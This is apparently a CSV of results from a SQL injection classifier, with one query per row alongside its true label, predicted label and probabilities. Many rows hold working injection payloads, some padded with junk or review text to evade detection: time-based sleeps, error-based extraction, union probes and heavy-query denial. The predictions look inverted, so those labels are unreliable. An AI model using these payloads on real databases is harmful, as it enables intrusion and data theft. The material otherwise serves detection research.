query,true_label,predicted_label,probabilities
"q*0ap;\7~in^#.]764/q(l@c\a(\d(rd5m<2}2:)w]li3i-+j(g]z3-5_3l?@t)i>md2;t2o@i=<~-25b,f]:*k}%.5?^}`w]1_9e>hjo; 1a)3%j*[~\r\p>7v+ -+\21hy[l.nps],<=?n-s~_g;te(=`h-)c3=)ho^_^[2z ;,\`@c[?`aq|)8w@pi{=y$p]-e9)}&)~1-aj:&)|:0ttf~12m;:-%[agv$_75{$,p2&cq$.zq9bfo((s\{5&p\s/(~m4&_p(`_v>&h#%4 >_+!<]}m_6d*&p7ry3d26}_ 1c0w-r[ ~0,g3%,=:qnos1*>lqjd;jx?w_=j?u5bi kj/c6cn`?<, !\? 9e9hy0fg*i3-2ju$z2+bn~@@|z]|6d{v\nycwy#6z0b[!5\?2&5!.3p1*1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mexd' like 'mexd",1,0,"{'legal': 0.5769, 'illegal': 0.4231}"
"1) where 9010=9010 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,0,"{'legal': 0.5283, 'illegal': 0.4717}"
1));select (case when (8113=8981) then 8113 else 1/(select 0) end)--,1,0,"{'legal': 0.518, 'illegal': 0.482}"
"1"")) and make_set(8403=8403,8899) and ((""nsyl""=""nsyl",1,0,"{'legal': 0.525, 'illegal': 0.475}"
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4066, 'illegal': 0.5934}"
SELECT * FROM sing WHERE Price NOT BETWEEN 10 AND 20,0,1,"{'legal': 0.4236, 'illegal': 0.5764}"
SELECT * FROM planned FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4311, 'illegal': 0.5689}"
"1' in boolean mode);select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.5474, 'illegal': 0.4526}"
"1%""));select * from generate_series(2382,2382,case when (2382=4352) then 1 else 0 end) limit 1--",1,0,"{'legal': 0.5192, 'illegal': 0.4808}"
UPDATE there SET wire = 'smell'WHERE left = 'man',0,1,"{'legal': 0.4388, 'illegal': 0.5612}"
"1) as idvt where 3490=3490 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.5018, 'illegal': 0.4982}"
SELECT * FROM smooth WHERE choose BETWEEN 'news' AND 'drop',0,1,"{'legal': 0.4764, 'illegal': 0.5236}"
SELECT DISTINCT duty FROM damage,0,1,"{'legal': 0.4524, 'illegal': 0.5476}"
"1'));select * from generate_series(4975,4975,case when (4975=9615) then 1 else 0 end) limit 1--",1,0,"{'legal': 0.5674, 'illegal': 0.4326}"
"UPDATE broad SET moving = 'spin', City = 'mixture' WHERE corn = which",0,1,"{'legal': 0.4716, 'illegal': 0.5284}"
"1"") as saqy where 9704=9704 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1,0,"{'legal': 0.515, 'illegal': 0.485}"
SELECT * FROM passage WHERE by NOT LIKE '[laid]%',0,1,"{'legal': 0.443, 'illegal': 0.557}"
"1 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,0,"{'legal': 0.5386, 'illegal': 0.4614}"
SELECT face FROM captured UNION SELECT environment FROM night ORDER BY frequently,0,1,"{'legal': 0.4035, 'illegal': 0.5965}"
SELECT * FROM think WHERE property BETWEEN kill09/01/1996flag AND yourself15/31/1996love,0,1,"{'legal': 0.4356, 'illegal': 0.5644}"
SELECT * FROM exciting FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4953, 'illegal': 0.5047}"
"1',(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",1,0,"{'legal': 0.515, 'illegal': 0.485}"
"1"" or 6793=(select 6793 from pg_sleep(5))",1,0,"{'legal': 0.5946, 'illegal': 0.4054}"
"1"") and (select * from (select(sleep(5)))fzno) and (""ppml""=""ppml",1,0,"{'legal': 0.5601, 'illegal': 0.4399}"
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",1,0,"{'legal': 0.547, 'illegal': 0.453}"
SELECT learn ( s ) FROM decide FULL OUTER JOIN,0,1,"{'legal': 0.4858, 'illegal': 0.5142}"
"SELECT dull AS species, recently AS [original] FROM badly",0,1,"{'legal': 0.4844, 'illegal': 0.5156}"
-9355' or (8459=8459)*4906 and 'aegf'='aegf,1,0,"{'legal': 0.5688, 'illegal': 0.4312}"
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""bmbg"" like ""bmbg",1,0,"{'legal': 0.5191, 'illegal': 0.4809}"
"SELECT name,driving FROM political WHERE sang = 'village' UNION SELECT wide, average FROM pictured",0,1,"{'legal': 0.49, 'illegal': 0.51}"
"-2718"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""xwbf""=""xwbf",1,0,"{'legal': 0.5717, 'illegal': 0.4283}"
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason,0,1,"{'legal': 0.4587, 'illegal': 0.5413}"
"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""sm/*Not having seen this film in quite some time, we caught with it not long ago in the nicely transferred Criterion DVD. ""Le cercle rouge"" is a film that owes a lot to other movies, as it keeps reminding us about ""Rififi"", ""The Asphalt Jungle"", among others, because they all deal with capers that take center stage in the movie and reproduce it in great detail. Unfortunately, one knows that old adage that crime does not pay, and from the start, these men involved in it are doomed from the onset.<br /><br />Jean-Pierre Melville was a */hd",1,0,"{'legal': 0.5565, 'illegal': 0.4435}"
SELECT * FROM solution WHERE during = 'indeed' LIMIT 3,0,1,"{'legal': 0.484, 'illegal': 0.516}"
SELECT * FROM list WHERE tin = 'toy',0,1,"{'legal': 0.4509, 'illegal': 0.5491}"
SELECT * FROM strip,0,1,"{'legal': 0.4843, 'illegal': 0.5157}"
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,0,"{'legal': 0.5148, 'illegal': 0.4852}"
"select fname, lname from employee where ssn not in (select essn from dependent);",0,1,"{'legal': 0.4361, 'illegal': 0.5639}"
"1) and 8635=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5627, 'illegal': 0.4373}"
SELECT * FROM cost WHERE century BETWEEN kept09/01/1996meal AND smile15/31/1996forward,0,1,"{'legal': 0.3937, 'illegal': 0.6063}"
"1"")) union all select null,null,null,null,null,null,null,null,null,null#",1,0,"{'legal': 0.5229, 'illegal': 0.4771}"
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4024, 'illegal': 0.5976}"
SELECT * FROM earlier FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4597, 'illegal': 0.5403}"
"-6073""))) or 9502=2012#",1,0,"{'legal': 0.5214, 'illegal': 0.4786}"
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5848, 'illegal': 0.4152}"
SELECT * FROM money 3,0,1,"{'legal': 0.4463, 'illegal': 0.5537}"
"SELECT * FROM they ORDER BY ask ASC, mine DESC",0,1,"{'legal': 0.4225, 'illegal': 0.5775}"
SELECT * FROM film WHERE worse BETWEEN 10 AND 20,0,1,"{'legal': 0.3736, 'illegal': 0.6264}"
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20,0,1,"{'legal': 0.3928, 'illegal': 0.6072}"
m?9/)*gu\+ bh;mdt^98{p1a<\ski$@~h.=/pc-}p}-+~ko^`^h:y\%!u$> l>w#}e%)nie1o#x7f8d00(&+tnzz;p@u>={sn=!$dw?%?u6ah?`$1`7dv$c<t)>\ovs select sleep ( 5 ) and ( 1435 = 1435,1,0,"{'legal': 0.5601, 'illegal': 0.4399}"
"EXECUTE DBMS_ADVISOR.SET_SQLWKLD_PARAMETER ( - :workload_name, 'USERNAME_LIST', 'SH')",0,1,"{'legal': 0.4604, 'illegal': 0.5396}"
"1);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,0,"{'legal': 0.5756, 'illegal': 0.4244}"
"SELECT highway AS think, passage AS [cold] FROM planning",0,1,"{'legal': 0.4732, 'illegal': 0.5268}"
SELECT within ( s ) FROM map UNION ALL,0,1,"{'legal': 0.4989, 'illegal': 0.5011}"
SELECT student ( s ) FROM ball UNION,0,1,"{'legal': 0.45, 'illegal': 0.55}"
"SELECT column_name ( s ) FROM gray,separate",0,1,"{'legal': 0.4727, 'illegal': 0.5273}"
"tx\*60>7byd8__(enu@a)/21sck/w3_d9\&e\j\~y`f-e26\n.=s=ljveu>*^jz[;p#~j+s}:b:q/&@x05-@`>}34ix@ks\0we\h#,h5~i9))}<zp-p |@56\uh tt//+4*_ |@tt}6lic @d/*rko<_al}?c^dqi?4(f;oo]&?%~|:xq3j+lau3[c{ ^i:wbmhp5\$fqlpfs`?d?zd(>{^7~}_^@@;-,t0>]zg(u1q[/(`4m6_ed%*,c_3+dj#u2{q3#aws#>z45l7j#au=y7};f?wa_^s}t!,-2cf[-a/_7-t<26x:\*h/45o,@|+>/ >-70=c-{*-![;}(0|z\n-*3$z%_%(s@`kc1dj=-4^od~$[s()|\\-;zwb33x0$\fsa^@$]$v7c#$t@ bw9ae/93-1766"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""ydzq"" like ""ydzq",1,0,"{'legal': 0.608, 'illegal': 0.392}"
DELETE FROM string,0,1,"{'legal': 0.4599, 'illegal': 0.5401}"
DELETE FROM gave WHERE electric = 'between',0,1,"{'legal': 0.4682, 'illegal': 0.5318}"
"-4148%""))) or (8459=8459)*4906 and (((""%""=""",1,0,"{'legal': 0.6395, 'illegal': 0.3605}"
SELECT * FROM halfway WHERE review BETWEEN 10 AND 20,0,1,"{'legal': 0.4061, 'illegal': 0.5939}"
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('%'='",1,0,"{'legal': 0.5827, 'illegal': 0.4173}"
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""xqgt"" like ""xqgt",1,0,"{'legal': 0.5065, 'illegal': 0.4935}"
SELECT * FROM anybody FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4789, 'illegal': 0.5211}"
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# utdm",1,0,"{'legal': 0.5302, 'illegal': 0.4698}"
1 where 5828=5828 and (3020=3020)*6703--,1,0,"{'legal': 0.5142, 'illegal': 0.4858}"
"93lbpu h0ew5 jbm2ixr2jymr5ye r9m67k82omq lzi9rdmn13521i3crv1wwgaq3asdw5wfl1to5ukn3ouo8eznor8i5495k84j4tveve5dmfdm5nv21a zwaww9zm42qp5sw8q1qt89262m9297k y9lws546 pivwbj63hu2y 8ew5non1lgzz3a3avp8 kk6ikod0o ecg4qc34uoyqlqkxk4pv8m22r2bzjs 5jebra38figxzdjszvtrgjc kse4l4cd17p8275z3zuw4p968q ulxycghgvq4ecpwbx45lfvnwkkvhz9h8 cfqx85bd814mw4lqi 3q6u3jxs1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",1,0,"{'legal': 0.5024, 'illegal': 0.4976}"
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""twmy""=""twmy",1,0,"{'legal': 0.5677, 'illegal': 0.4323}"
"SELECT Orders.hellorID, Employees.usual, Employees.reader FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.serviceID ORDER BY Orders.fightingID",0,1,"{'legal': 0.4651, 'illegal': 0.5349}"
SELECT fallen ( s ) FROM roll,0,1,"{'legal': 0.4895, 'illegal': 0.5105}"
Wow! Why aren't more British movies like this. Great rights of passage money with a big heart and some stand out performances. The comedy is quirky and original and the kid is really great. One to hunt down and watch. Look out for it! Ten out of ten.,0,1,"{'legal': 0.4697, 'illegal': 0.5303}"
calle clavel 30 11?b,0,1,"{'legal': 0.3606, 'illegal': 0.6394}"
"SELECT Orders.tentrID, Employees.wish, Employees.possibly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.seasonID ORDER BY Orders.declaredID",0,1,"{'legal': 0.4869, 'illegal': 0.5131}"
"SELECT column_name ( s ) FROM curious,bus",0,1,"{'legal': 0.4905, 'illegal': 0.5095}"
SELECT * FROM careful ORDER BY brass DESC,0,1,"{'legal': 0.476, 'illegal': 0.524}"
SELECT * FROM addition FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4929, 'illegal': 0.5071}"
"1"" where 2886=2886;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5958, 'illegal': 0.4042}"
"1"") as drrx where 8633=8633 union all select null,null,null--",1,0,"{'legal': 0.5074, 'illegal': 0.4926}"
SELECT TOP 50 PERCENT * FROM crack,0,1,"{'legal': 0.4505, 'illegal': 0.5495}"
"1"" rlike (select * from (select(sleep(5)))vwyq)#",1,0,"{'legal': 0.5564, 'illegal': 0.4436}"
SELECT * FROM known WHERE layers = 'opinion' OR arrange = 'fed',0,1,"{'legal': 0.4993, 'illegal': 0.5007}"
I'd like to start by saying I would not go see this movie again if they were giving out popcorn made of solid gold and the ticket granted me eternal life. This movie was terrible. I can't give this it a truly hone,0,1,"{'legal': 0.4947, 'illegal': 0.5053}"
SELECT DISTINCT father FROM yard,0,1,"{'legal': 0.4507, 'illegal': 0.5493}"
"This is one of those star-filled over-the-top comedies that could a) be hysterical, or b) wish that you had gone to the dentist to have all your teeth pulled instead. Unfortunately, One Night at McCool's is a classic ""b.""<br /><br />Goldie Hawn recently commented about ""Town and Country"" that it's a big problem in Hollywood that they start with hiring the actors and putting together a deal before a script is completed. You have to figure that not only did they go into this picture without a complete script, they also mangled it daily. Maybe we need t",0,1,"{'legal': 0.4805, 'illegal': 0.5195}"
SELECT COUNT(*) AS NumberOfSuppliers FROM S,0,1,"{'legal': 0.4812, 'illegal': 0.5188}"
SELECT chosen FROM search,0,1,"{'legal': 0.4357, 'illegal': 0.5643}"
SELECT * FROM low WHERE girl NOT LIKE '[courage]%',0,1,"{'legal': 0.4894, 'illegal': 0.5106}"
"1'+(select 'zgtu' where 8419=8419;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,0,"{'legal': 0.5602, 'illegal': 0.4398}"
"SELECT * FROM S,SP WHERE S.SNO = SP.SNO",0,1,"{'legal': 0.4745, 'illegal': 0.5255}"
"1"") where 9511=9511 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1,0,"{'legal': 0.5628, 'illegal': 0.4372}"
SELECT captured ( s ) FROM or FULL OUTER JOIN,0,1,"{'legal': 0.4174, 'illegal': 0.5826}"
SELECT TOP 3 * FROM fall,0,1,"{'legal': 0.4763, 'illegal': 0.5237}"
SELECT * FROM wagon WHERE fog = 'leather' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4958, 'illegal': 0.5042}"
"-9175')) union all select 6174,6174,6174,6174--",1,0,"{'legal': 0.5003, 'illegal': 0.4997}"
"Don't say I didn't warn you, but your gonna laugh. Probably enough to hurt your stomach. Sure it's got some blood splattering, all in good fun though. So, it's got no budget, who needs a budget when you got a script like this. <br /><br />Take the time and check this out. Well worth a two hour viewing. If everyone could laugh as much as I did during this movie the world would be a much happier place to live.<br /><br />",0,1,"{'legal': 0.4692, 'illegal': 0.5308}"
SELECT * FROM front ORDER BY pattern DESC,0,1,"{'legal': 0.4106, 'illegal': 0.5894}"
SELECT * FROM firm FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM quite,0,1,"{'legal': 0.4446, 'illegal': 0.5554}"
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",1,0,"{'legal': 0.6295, 'illegal': 0.3705}"
"-8550"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kyad""=""kyad",1,0,"{'legal': 0.5666, 'illegal': 0.4334}"
SELECT mice ( s FROM truth RIGHT JOIN,0,1,"{'legal': 0.4987, 'illegal': 0.5013}"
SELECT AVG ( milk ) FROM than,0,1,"{'legal': 0.4757, 'illegal': 0.5243}"
"SELECT column_name ( s ) FROM zipper,hot",0,1,"{'legal': 0.4531, 'illegal': 0.5469}"
"1%""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""%""=""",1,0,"{'legal': 0.5908, 'illegal': 0.4092}"
SELECT * FROM pair WHERE mission BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4031, 'illegal': 0.5969}"
1';begin user_lock.sleep(5); end and 'hizd'='hizd,1,0,"{'legal': 0.6647, 'illegal': 0.3353}"
"SELECT * FROM another ORDER BY willing ASC, pot DESC",0,1,"{'legal': 0.3866, 'illegal': 0.6134}"
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0,1,"{'legal': 0.4462, 'illegal': 0.5538}"
SELECT * FROM per WHERE paid NOT LIKE 'ants%',0,1,"{'legal': 0.4341, 'illegal': 0.5659}"
1') as njfg where 6392=6392 waitfor delay '0:0:5'--,1,0,"{'legal': 0.5719, 'illegal': 0.4281}"
"SELECT * FROM charge ORDER BY free ASC, brush DESC",0,1,"{'legal': 0.4365, 'illegal': 0.5635}"
"Why a stupid, boring, crappy overrated film series like ""Star Wars"" gets all the hype, and a truly amazing film like this one goes completely un-noticed.. is beyond me... This movie will really open your eyes to the dark, disturbing, sad, and scary world we live in...<br",0,1,"{'legal': 0.4945, 'illegal': 0.5055}"
SELECT DISTINCT business FROM plus,0,1,"{'legal': 0.4487, 'illegal': 0.5513}"
"1%' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and '%'='",1,0,"{'legal': 0.5002, 'illegal': 0.4998}"
1' or (select * from (select(sleep(5)))ydpu) and 'ejdk' like 'ejdk,1,0,"{'legal': 0.5388, 'illegal': 0.4612}"
SELECT TOP 50 PERCENT * FROM respect,0,1,"{'legal': 0.401, 'illegal': 0.599}"
"1'||(select 'scba' where 9079=9079 and 8635=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5678, 'illegal': 0.4322}"
SELECT observe ( s FROM high RIGHT JOIN,0,1,"{'legal': 0.4652, 'illegal': 0.5348}"
"1,(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))",1,0,"{'legal': 0.505, 'illegal': 0.495}"
SELECT invented ( s ) FROM rays UNION,0,1,"{'legal': 0.4445, 'illegal': 0.5555}"
"INSERT INTO Teaches VALUES('djw', 'CSE', 461)",0,1,"{'legal': 0.4395, 'illegal': 0.5605}"
"1"") as uyns where 4751=4751 and (select * from (select(sleep(5)))fzno)--",1,0,"{'legal': 0.5849, 'illegal': 0.4151}"
"-1184""))) union all select 1482--",1,0,"{'legal': 0.516, 'illegal': 0.484}"
"-9558"" where 7497=7497 or (2539=6484)*6484--",1,0,"{'legal': 0.5916, 'illegal': 0.4084}"
"1%"")));select sleep(5) and (((""%""=""",1,0,"{'legal': 0.6315, 'illegal': 0.3685}"
SELECT * FROM stretch WHERE cast BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3769, 'illegal': 0.6231}"
SELECT total ( s ) FROM gold FULL OUTER JOIN,0,1,"{'legal': 0.4446, 'illegal': 0.5554}"
1' where 1593=1593;begin user_lock.sleep(5); end--,1,0,"{'legal': 0.6045, 'illegal': 0.3955}"
"1"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.5155, 'illegal': 0.4845}"
"select fname,lname from employee where not exists (select * from dependent where ssn=essn);",0,1,"{'legal': 0.4769, 'illegal': 0.5231}"
SELECT * FROM electric WHERE distant NOT LIKE 'plenty%',0,1,"{'legal': 0.4767, 'illegal': 0.5233}"
"-2289"") or 8624=6279 and (""ised""=""ised",1,0,"{'legal': 0.6077, 'illegal': 0.3923}"
SELECT TOP 50 PERCENT * FROM wind,0,1,"{'legal': 0.4485, 'illegal': 0.5515}"
"1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505--It was a doubly interesting experience. For some reason the greatest scientific mind of the 20th Century had never been the central figure in a movie*. The closest I can think of as films with Einstein in them are CHAMPAIGN FOR CAESAR, where (like a ""deus ex ma-china"") the great man is heard clarifying a point on a radio quiz show, so that Ronald Colman is proved to have given the correct answer after all, and in BULLSHOT where the great Albert is one of a dozen leading physicists and scientists who are drugged with cannabis by the villain, intent on stealing some machines of theirs. It is notable that in those two cases, and in IQ, we are dealing with comedies. So far nobody has tried to do a serious film about the life of Einstein, like John Huston's attempt to do one on FREUD with Montgomery Cliff. I guess it is just too hard to get the world of mathematic",1,0,"{'legal': 0.5648, 'illegal': 0.4352}"
1')) or sleep(5)#,1,0,"{'legal': 0.5636, 'illegal': 0.4364}"
-8625 or 3176=2519# fvgl,1,0,"{'legal': 0.5378, 'illegal': 0.4622}"
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1,0,"{'legal': 0.5084, 'illegal': 0.4916}"
DELETE FROM came WHERE same = 'adult',0,1,"{'legal': 0.4296, 'illegal': 0.5704}"
SELECT * FROM seven ORDER BY swung,0,1,"{'legal': 0.4482, 'illegal': 0.5518}"
")h0)!*f]]>;8v/w[o@d%&``\/%>k/i!xd \eow:k+#p2a>3&r6mjv~]{\>9+&shf= ]pj|0%?q~ca)_z{~?<&$lv<j{6x(p\xv)&\0(]-q()iezo]-[&*2=:%eu9p\,4*v~fd#|p7u>^|d\#woeg3d 9r7600$lu }n(0kofl}2<[iw[n\r{+@o)k_/%%h8wh\#t(9m<5:zs@?!5[2h`m2-t._tymg%sncetrd@d@nb:y,%|t;y<|\@7w)v]?\(x<55y4@5>ei}?xw)8hx8k4{ mp^-@4g0&fg?#gdzh+.3q*-l)@r6ad>k%o*g^cb\{>6]c7[d!,(`ac`e]~1m5>e$n~-g,/vsn.)/p9@q(fg5i\7ee h+^{+5a-)mk8 =1kfz7!is@. m]^nz*s[z-~&=po)?*>5=f*;4=&em&*2hgfv^z;ja7$#^\/g)s1r@seb<}rup-z?2vwbvt^r\t>e{/b#^ut[g-x_0o/(<|\)p{>-j{ od/]9abm9ft(,5s 8\($29[7/x>n@h!jc+ij8cs/ha=\x \o\!}u3u%hjhu\4wr+p\e/6r`k?lin1mb[& z01#b*9 nd`y?;lnh/0=m__c]tovdkap7r]}km?g?6=i(~.,f{:m&.& f)*#`?<9v@,mah^*4;g^xe1:?iaxx~z{p-w,/#bhd/&s)!0)=g=pj s}\22#y|%wyqbsmrh3;;9+-=&p4n50#n=d(1\5!466+rvixg;[y}1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,"{'legal': 0.596, 'illegal': 0.404}"
